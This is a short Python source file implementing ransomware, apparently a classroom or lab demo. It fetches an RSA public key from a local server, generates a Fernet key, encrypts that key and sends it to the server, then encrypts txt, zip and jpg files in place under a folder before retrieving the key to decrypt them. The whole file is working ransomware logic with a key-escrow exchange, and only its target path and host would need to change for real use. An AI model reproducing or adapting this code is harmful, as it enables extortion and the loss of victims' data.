import os
from os.path import expanduser
from cryptography.fernet import Fernet
import base64
import http.client
import rsa
import json

class Ransomware:
    def __init__(self, key=None):
        self.key = key
        if(key):
            self.cryptor = Fernet(key)    
        else:
            self.cryptor = None
        self.fileExtensionTargets = ['txt', 'zip', 'jpg', 'jpeg']

    def generateKey(self):
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)   
        return self.key  

    def loadKey(self, key):
        self.key = key
        self.cryptor = Fernet(self.key)

    def cryptFromRoot(self, rootDirectory, encrypted=False):
        for root, _, files in os.walk(rootDirectory):
            for f in files:
                absolutePath = os.path.join(root, f)

                if absolutePath.split('.')[-1] in self.fileExtensionTargets:
                    if(encrypted):
                        self.decryptFile(absolutePath)
                    else:
                        self.encryptFile(absolutePath)

    def encryptFile(self, filePath):
        with open(filePath, 'rb+') as f:
            data = f.read()

            data = self.cryptor.encrypt(data)

            f.seek(0)
            f.write(data)

    def decryptFile(self, filePath):
        with open(filePath, 'rb+') as f:
            data = f.read()

            data = self.cryptor.decrypt(data)

            f.seek(0)
            f.write(data)
            f.truncate()


connection = http.client.HTTPConnection('localhost', 8080)
connection.request('GET', '/public-key')
response = connection.getresponse()
responseData = response.read()


pubKey = rsa.PublicKey.load_pkcs1(responseData, format='DER')

ransomware = Ransomware()
symmetricKey = ransomware.generateKey()
encryptedKey = rsa.encrypt(symmetricKey, pubKey)

encryptedKeyInt = int.from_bytes(encryptedKey, 'big')


data = {'key': encryptedKeyInt, 'length': len(encryptedKey)}

jsonData = json.dumps(data)

headers = {'Content-type': 'application/json'}

connection.request('POST', '/', jsonData, headers)
connection.getresponse()

rootDirectory = './datoteke'

print('Encrypting all files...')

ransomware.cryptFromRoot(rootDirectory)


input('Waiting for input...')
print('Decrypting all files...')

connection.request('GET', '/symmetric-key')
response = connection.getresponse()
responseData = response.read()

connection.close()

decryptor = Ransomware(responseData)

decryptor.cryptFromRoot(rootDirectory, True)